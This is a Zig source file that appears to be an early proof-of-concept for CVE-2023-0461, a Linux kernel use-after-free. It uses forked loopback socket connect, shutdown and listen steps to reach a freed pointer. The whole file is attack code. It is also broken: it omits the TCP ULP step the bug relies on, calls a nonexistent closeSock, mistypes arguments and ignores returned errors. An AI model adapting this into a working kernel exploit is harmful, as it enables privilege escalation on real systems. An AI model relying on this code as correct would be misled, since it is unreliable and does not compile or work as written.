const std = @import("std");
const log = std.log;
const net = std.net;
const os = std.os;
const errno = os.errno;
const l = os.linux;
const E = l.E;
const mem = std.mem;

const SOL = struct {
    pub const TCP = 6;
};

fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
    var n = 10;
    var last_err: os.ConnectError = undefined;

    while (n > 0) : (n -= 1) {
        os.connect(sock, &sock_addr.sa, len) catch |err| {
            last_err = err;
            os.nanosleep(0, 10000);

            continue;
        };

        return;
    }

    return last_err;
}

pub fn cve_2023_0461() !void {
    const server_addr = net.Ip4Address.parse("127.0.0.1", 0xf00b);
    const target_addr = net.Ip4Address.parse("127.0.0.1", 0xdead);
    const addr_sz = @sizeOf(server_addr.sa);

    const child_pid = try os.fork();

    if (child_pid == 0) {
        {
            const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
            defer os.closeSocket(server_sk);

            try os.bind(server_sk, &server_addr.sa, addr_sz);
            try os.listen(server_sk, 1);

            const client_sk = try os.accept(server_sk, &server_addr.sa, addr_sz);
            os.closeSocket(client_sk);
        }

        const client_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk);

        try retry_connect(client_sk, &target_addr.sa, addr_sz);

        return;
    }

    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(target_sk);

    try retry_connect(target_sk, &server_addr.sa, addr_sz);
    try os.shutdown(target_sk, .both);
    try os.listen(target_sk, 1);

    const client_sk = try os.accept(target_sk, &target_addr.sa, addr_sz);
    os.closeSock(client_sk);

    _ = try os.waitpid(child_pid, 0);

    log.info("Now have a reference to a freed ptr?", .{});
}
